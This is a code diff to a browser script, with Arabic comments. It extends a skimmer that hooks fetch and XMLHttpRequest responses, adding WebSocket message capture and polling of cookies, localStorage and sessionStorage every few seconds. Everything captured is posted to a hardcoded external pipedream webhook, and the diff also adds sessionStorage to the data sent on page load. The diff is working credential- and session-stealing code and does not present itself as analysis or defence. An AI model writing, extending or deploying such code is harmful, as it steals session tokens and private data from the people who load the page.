@@ -6,6 +6,8 @@
   const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";
 
   function sendToWebhook(data) {
+    // فلترة عشان ما نبعتش طلبات للويب هوك تسبب loop
+    if (data.url && data.url.startsWith(WEBHOOK_URL)) return;
     fetch(WEBHOOK_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -20,7 +22,6 @@
       return originalFetch.apply(this, args).then(async response => {
         const cloned = response.clone();
         let responseBody = null;
-
         try {
           responseBody = await cloned.json();
         } catch {
@@ -28,7 +29,6 @@
             responseBody = await cloned.text();
           } catch {}
         }
-
         sendToWebhook({
           type: "fetch-response",
           url: response.url,
@@ -37,7 +37,6 @@
           body: responseBody,
           timestamp: new Date().toISOString()
         });
-
         return response;
       });
     };
@@ -62,7 +61,6 @@
         } catch {
           responseBody = this.responseText;
         }
-
         sendToWebhook({
           type: "xhr-response",
           method: this._method,
@@ -73,18 +71,67 @@
           timestamp: new Date().toISOString()
         });
       });
-
       return originalSend.apply(this, arguments);
     };
   })();
 
-  // إرسال بيانات أولية
+  // مراقبة WebSocket
+  (function() {
+    const OriginalWebSocket = window.WebSocket;
+    window.WebSocket = function(url, protocols) {
+      const ws = protocols ? new OriginalWebSocket(url, protocols) : new OriginalWebSocket(url);
+
+      ws.addEventListener('message', event => {
+        sendToWebhook({
+          type: 'websocket-message',
+          url: url,
+          data: event.data,
+          timestamp: new Date().toISOString()
+        });
+      });
+
+      return ws;
+    }
+  })();
+
+  // مراقبة تغير localStorage و sessionStorage كل 5 ثواني
+  let lastLocalStorage = null;
+  let lastSessionStorage = null;
+  setInterval(() => {
+    try {
+      const currentLS = JSON.stringify(localStorage);
+      const currentSS = JSON.stringify(sessionStorage);
+      if (currentLS !== lastLocalStorage) {
+        lastLocalStorage = currentLS;
+        sendToWebhook({type: "localStorage-changed", localStorage: currentLS, timestamp: new Date().toISOString()});
+      }
+      if (currentSS !== lastSessionStorage) {
+        lastSessionStorage = currentSS;
+        sendToWebhook({type: "sessionStorage-changed", sessionStorage: currentSS, timestamp: new Date().toISOString()});
+      }
+    } catch {}
+  }, 5000);
+
+  // مراقبة تغير الكوكيز كل 3 ثواني
+  let lastCookies = document.cookie;
+  setInterval(() => {
+    if (document.cookie !== lastCookies) {
+      lastCookies = document.cookie;
+      sendToWebhook({type: "cookie-changed", cookies: lastCookies, timestamp: new Date().toISOString()});
+    }
+  }, 3000);
+
+  // إرسال بيانات أولية عند تحميل الصفحة
   sendToWebhook({
     type: "initial-info",
     url: window.location.href,
     cookies: document.cookie || "No cookies",
     localStorage: (() => {
       try { return Object.assign({}, localStorage); }
+      catch { return "Access denied"; }
+    })(),
+    sessionStorage: (() => {
+      try { return Object.assign({}, sessionStorage); }
       catch { return "Access denied"; }
     })(),
     userAgent: navigator.userAgent,
